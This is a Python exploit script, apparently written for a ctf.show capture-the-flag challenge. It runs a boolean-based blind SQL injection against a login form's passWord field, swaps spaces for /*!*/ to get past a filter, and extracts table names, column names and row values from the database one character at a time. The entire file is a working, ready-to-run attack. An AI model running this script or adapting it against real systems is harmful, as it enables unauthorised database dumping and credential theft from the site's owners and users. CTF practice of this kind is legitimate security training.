# exp.py
import requests
import string
import warnings
# 缺失的导入补上
warnings.filterwarnings("ignore")

URL = "https://a1925c30-e83a-4af0-afc6-86206b3134fe.challenge.ctf.show/login.php"
FAIL = "script" # 页面存在script代表登录失败

def send_payload(payload):
    # 空格绕过放在最后组装完成的payload上
    payload = payload.replace(" ", "/*!*/")
    # ✅修复参数名称：userName / passWord 大写！注入点在passWord
    data = {
        "userName": "admin",
        "passWord": payload
    }
    # ✅增加verify=False 解决SSL证书报错 + 超时
    resp = requests.post(URL, data=data, allow_redirects=False, verify=False, timeout=10)
    # 返回True：页面找不到script，注入条件成立
    return resp.text.find(FAIL) == -1

def get_length(payload_template, min_len=1, max_len=100):
    for l in range(min_len, max_len):
        payload = payload_template.format(l)
        if send_payload(payload):
            return l
    return None

def get_string(payload_template, length):
    result = ""
    chars = string.ascii_letters + string.digits + "_{}@.-,! "
    for i in range(1, length+1):
        for c in chars:
            payload = payload_template.format(i, c)
            if send_payload(payload):
                result += c
                print(f"\r{result}", end="", flush=True)
                break
    print()
    return result

def get_table_names():
    print("[*] Getting table name length...")
    # ✅修复payload闭合！去掉前面admin，'直接闭合password字段
    length = get_length("' and (select length(group_concat(table_name)) from information_schema.tables where table_schema=database())={};-- ")
    print(f"[*] Table names length: {length}")

    print("[*] Getting table names...")
    names = get_string("' and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{},1))=ascii('{}');-- ", length)
    print(f"[*] Table names: {names.split(',')}")
    return names.split(',')

def get_column_names(table):
    print(f"[*] Getting column names length for {table}...")
    length = get_length(f"' and (select length(group_concat(column_name)) from information_schema.columns where table_name='{table}')={{}};-- ")
    print(f"[*] Column names length: {length}")

    print(f"[*] Getting column names for {table}...")
    names = get_string(f"' and ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='{table}'),{{}},1))=ascii('{{}}');-- ", length)
    print(f"[*] Column names: {names}")
    return names.split(',')

def get_field(table, column, row=0):
    print(f"[*] Getting length of {column} in {table} row {row}...")
    length = get_length(f"' and (select length({column}) from {table} limit {row},1)={{}};-- ", max_len=256)
    print(f"[*] Field length: {length}")

    if length is None:
        print(f"[!] Cannot determine length for {column} in {table} row {row}, skipping.")
        return ""

    print(f"[*] Getting value of {column} in {table} row {row}...")
    value = get_string(f"' and ascii(substr((select {column} from {table} limit {row},1),{{}},1))=ascii('{{}}');-- ", length)
    print(f"[*] Value: {value}")
    return value

if __name__ == "__main__":
    # 1. 获取所有表名
    tables = get_table_names()

    # 2. 获取每个表的列名
    for table in tables:
        columns = get_column_names(table)
        # 3. 获取每个表的每个字段内容
        for col in columns:
            for row in range(2):
                get_field(table, col, row)